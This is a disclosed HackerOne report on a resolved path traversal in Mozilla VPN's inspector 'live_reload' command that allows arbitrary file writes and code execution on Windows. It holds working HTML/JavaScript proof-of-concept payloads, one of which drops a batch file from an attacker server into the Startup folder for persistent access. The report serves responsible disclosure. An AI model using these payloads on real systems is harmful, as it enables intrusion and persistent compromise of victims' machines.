---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/path-traversal
  - env/network
  - vuln/xss
  - vuln/path-traversal
  - vuln/command-injection
  - impact/rce
substate: "resolved"
weakness: "Path Traversal"
enriched: true
body: true
date: 2025-07-29
submitted: 2025-02-15T12:46:43.220Z
bounty_usd: 6000
votes: 173
cve: []
program: "[[programs/mozilla|Mozilla]]"
reporter: "trein"
source: "https://hackerone.com/reports/2995025"
title: "Mozilla VPN Clients: RCE via file write and path traversal"
---
# Mozilla VPN Clients: RCE via file write and path traversal

> **Severity:** High | **Bounty:** 6,000 USD | **Votes:** 173 | **Program:** Mozilla | **Disclosed:** 2025-07-29

- Report: [https://hackerone.com/reports/2995025](https://hackerone.com/reports/2995025)
- CWE: Path Traversal
- Submitted: 2025-02-15T12:46:43.220Z

## Report summary

The report identifies a path traversal vulnerability in Mozilla VPN's client software that leads to Remote Code Execution (RCE). The vulnerability exists in the "live_reload" command of the client's inspector feature, which can be accessed when the client is in developer mode with "Use Staging Servers" enabled. The vulnerable code in the InspectorHotreloader::fetchAndAnnounce() function fails to properly sanitize file paths when downloading remote files to a temporary folder, allowing path traversal via the ".." sequence in Windows file paths. This enables an attacker to write arbitrary files to any location on the filesystem, which can be leveraged to achieve code execution.

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
Hi! I decided to have another look at the Mozilla VPN Client, after #2920675 was set to resolved. When going over all commands in the inspector, I noticed the "live_reload" command can be used with remote files. When using this command, the remote file is downloaded to a tmp folder. The problem is that there is a path traversal here, meaning we can override any file on the filesystem (tested on Windows).

Vulnerable code (InspectorHotreloader::fetchAndAnnounce() https://github.com/mozilla-mobile/mozilla-vpn-client/blob/main/src/inspector/inspectorhotreloader.cpp):
```
QObject::connect(
      request, &NetworkRequest::requestCompleted,
      [this, path, dummy_task](const QByteArray& data) {
        dummy_task->deleteLater();
        auto temp_path = QString("%1/%2").arg(m_qml_folder, path.fileName());
        auto temp_file = new QFile(temp_path);
        temp_file->open(QIODevice::WriteOnly);
        if (!temp_file->write(data)) {
          logger.warning() << "Unable to write to file:"
                           << temp_file->fileName();
          return;
        }
        if (!temp_file->flush()) {
          logger.warning() << "Unable to flush to file:"
                           << temp_file->fileName();
          return;
        }
        temp_file->close();
        QFileInfo info(temp_path);
        annonceReplacedFile(QUrl::fromLocalFile(info.absoluteFilePath()));
      });
```
You can see in the above snippet, that the temp_path  is simply a concatenation of a set directory and our filename.

## Steps To Reproduce:
  
1. Download Mozilla VPN here: https://www.mozilla.org/en-US/products/vpn/download/
  1. Turn on developer mode (see video PoC below):
      1. Open the help menu
      1. Click  the "Help" title 6 times rapidly
      1. In the developer options, check "Use Staging Servers"
      1. Fully close and reopen
  1. Save the following HTML and open it (change to your attacker_server)
``` html
<script>
    var ws = new WebSocket('ws://localhost:8765/');
    var attacker_server = "███████" // needs to be HTTP, no HTTPS
    
    payload = `live_reload ${attacker_server}/..\\..\\traversal_poc.dll`

    ws.onopen = function() {
        ws.send(payload); 
    };
    ws.onmessage = function(event) {
        document.getElementById("data").innerText += event.data + "\n";
    };
 </script>
 <h1>Data retrieved:</h1>
 <div id="data"></div>
```
1. Notice the file was written to C:\Users\user\AppData\Local\Mozilla instead of C:\Users\user\AppData\Local\Mozilla\Mozilla VPN\hot_reload.

## Supporting Material/References:
█████

Happy to help if anything is unclear!

## Impact

Any file can be overridden leading to RCE. This is exploitable via limited user interaction (simply opening the attacker site) when the staging servers are being used. ==Note that this does not work on macOS.== The impact is the same as in #2920675.

## Timeline

- **Report Filed**
- **2025-02-17** @trein: For completeness, an RCE PoC by writing a malicious file to the startup folder of the current user:

1. Host a malicious executable, I used https://ssrf.cvssadvisor.com/ for simplicity. Example:
```
@echo off
calc.exe
```
2. Edit the following html to include your attacker_server, then open it in the browser
```html
<script>
    var ws = new WebSocket('ws://localhost:8765/');
    var attacker_server = "███" // needs to be HTTP, no HTTPS
    
    payload = `live_reload ${attacker_server}/..\\..\\..\\..\\Roaming\\Microsoft\\Windows\\Start%20Menu\\Programs\\Startup\\traversal_poc.bat`

    ws.onopen = function() {
        ws.send(payload); 
    };
    ws.onmessage = function(event) {
        document.getElementById("data").innerText += event.data + "\n";
    };
 </script>
 <h1>Data retrieved:</h1>
 <div id="data"></div>
```

This gives the attacker permanent access to the victim device.

██████████

Regards,
Rein
- **Report Pending Program Review**
- **2025-02-18** @trein: Hey @frida-k, thanks for the update! Side note, in this exploit there is no MOTW (mark of the web) added to the malicious executable. This means that it will run without any warnings.
- **Report Triaged**
- **2025-03-04** @trein: Hey @frida-k,

Do you happen to have an update regarding this report? Happy to help if anything is unclear!
- **2025-03-06** @frida-k: thanks @trein , the team are working on a fix, they plan to remove the HTTP hot loaded in the inspected and add restrictions on the domains which can communicate with the web sockets.
- **Bounty Awarded**
- **2025-03-06** @trein: Thanks for the bounty and update @frida-k!
- **Report Resolved**
- **Agreed On Going Public**
- **2025-07-18** @frida-k: Hello @trein , no problem, I am checking with the team to see if they have concerns or pending work related to the bug. We now have a disclosure schedule and we would disclose the bug July 29th, do you prefer a limited disclosure or are you ok with full disclosure? Thanks.
- **2025-07-18** @trein: Hey @frida-k, happy to do a full disclosure. Thanks!
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
